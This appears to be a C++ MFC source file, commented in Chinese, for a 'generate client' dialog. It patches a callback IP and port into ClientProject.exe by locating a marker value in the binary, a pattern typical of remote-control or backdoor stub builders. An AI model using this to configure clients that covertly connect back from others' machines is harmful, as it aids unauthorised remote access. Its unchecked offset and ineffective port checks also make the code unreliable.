﻿// CreateClientDlg.cpp: 实现文件
//

#include "pch.h"
#include "ServerPoject.h"
#include "CreateClientDlg.h"
#include "afxdialogex.h"



struct _SERVER_CONNECT_INFO
{
	DWORD CheckFlag;   //搜索
	char  Ip[20];
	USHORT   Port;
}__ConnectInfo = { 0x87654321,"",0 };


// CCreateClientDlg 对话框

IMPLEMENT_DYNAMIC(CCreateClientDlg, CDialogEx)

CCreateClientDlg::CCreateClientDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_CREATE_CLIENT_DIALOG, pParent)
	, m_IpEdit(_T("输入一个IP"))
	, m_PortEdit(_T("输入一个端口号"))
{

}

CCreateClientDlg::~CCreateClientDlg()
{
}

void CCreateClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_IP_EDIT, m_IpEdit);
	DDX_Text(pDX, IDC_PORT_EDIT, m_PortEdit);
}


BEGIN_MESSAGE_MAP(CCreateClientDlg, CDialogEx)
	ON_BN_CLICKED(IDOK, &CCreateClientDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CCreateClientDlg 消息处理程序


BOOL CCreateClientDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetWindowText(_T("生成客户端程序"));
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CCreateClientDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码

	CFile FileObject;		//创建一个文件对象

	UpdateData(TRUE);   //输入在控件上的数据更新到控件变量上IP和PORT的控件
	USHORT  Port = atoi(m_PortEdit);		//将字符串格式化为int类型
	strcpy(__ConnectInfo.Ip, m_IpEdit);		//将m_IpEdite中的数据拷贝到连接信息中的IP中
	//127 
	if (Port < 0 || Port>65536)				//判断端口范围，如果不在合理范围内，则规定值为8888
	{
		__ConnectInfo.Port = 8888;
	}
	else
	{
		__ConnectInfo.Port = Port;			//端口，将Port中的信息格式化到连接信息中	
	}

	TCHAR v1[MAX_PATH];
	ZeroMemory(v1, MAX_PATH);

	LONGLONG BufferLength = 0;
	BYTE* BufferData = NULL;
	CString  v3;
	CString  ClientFullPath;
	try
	{
		//ClientProject.exe 与 ServerProject.exe 在同一个目录下
		//此处得到未处理前的文件名
		//检索包含指定模块的文件的完全限定路径。 模块必须已由当前进程加载。
		GetModuleFileName(NULL, v1, MAX_PATH);     //得到文件名  完整路径    Z:\ServerProject\\Debug\\ServerProject.exe
		v3 = v1;		//将v1中的值赋值给另一个变量中进行操作。
		int Pos = v3.ReverseFind(_T('\\'));   //从右到左查询第一次出现的\\  C:...\\\\Debug\\
		//得到最后一个路径之前的路径
		v3 = v3.Left(Pos);   // Z:\ServerProject\\Debug\\

		//将最后一个路径后添加clientProject.exe
		ClientFullPath = v3 + _T("\\ClientProject.exe");   // Z:\ServerProject\\Debug\\ClientProject.exe
																	//打开文件
		FileObject.Open(ClientFullPath, CFile::modeRead | CFile::typeBinary);

		BufferLength = FileObject.GetLength();				//得到目标文件的大小，动态申请内存
		BufferData = new BYTE[BufferLength];
		ZeroMemory(BufferData, BufferLength);
		//读取文件内容

		FileObject.Read(BufferData, BufferLength);		//将对方的文件整体读取到自己内存中
		FileObject.Close();		//读取完成后要关闭文件对象
		//写入上线IP和端口 主要是寻找0x1234567这个标识然后写入这个位置

		//全局变量是在PE文件的Data节中
		//在BufferData中查找__ConnectInfo.CheckFlag的值，返回值是在BufferData中匹配的第一个值
		int Offset = MemoryFind((char*)BufferData, (char*)&__ConnectInfo.CheckFlag,
			BufferLength, sizeof(DWORD));
		//将__ConnectInfo写入BufferData中
		memcpy(BufferData + Offset, &__ConnectInfo, sizeof(__ConnectInfo));   //写操作
		//保存到文件
		FileObject.Open(ClientFullPath, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
		FileObject.Write(BufferData, BufferLength);
		FileObject.Close();
		delete[] BufferData;
		MessageBox("生成成功");
	}
	catch (CMemoryException* e)
	{
		MessageBox("内存不足");
	}
	catch (CFileException* e)
	{
		MessageBox("文件操作错误");
	}
	catch (CException* e)
	{
		MessageBox("未知错误");
	}


	CDialogEx::OnOK();
}

int CCreateClientDlg::MemoryFind(const char* BufferData, const char* KeyValue, int BufferLength, int KeyLength)
{
	//定义两个变量用于循环
	int i, j;
	if (KeyLength == 0 || BufferLength == 0)
	{
		return -1;
	}
	//BF 匹配算法
	//abcdefg
	//cde				
	//当i=0的时候，j=0时，从a开始查找：a!=c,所以跳转到b
	//当i=1的时候，j=0时，从b开始查找，b！=c，所以跳转到c
	//当i=2的时候，j=0时，从c开始查找，c=c匹配，当j=3的时候，keyvalue已经被遍历完成了
	for (i = 0; i < BufferLength; i++)
	{
		for (j = 0; j < KeyLength; j++)
		{
			if (BufferData[i + j] != KeyValue[j])
			{
				break;
			}
		}
		//0x12345678   78   56  34  12
		if (j == KeyLength)
		{
			return i;
		}
	}
	// BMK Hello
	return -1;
}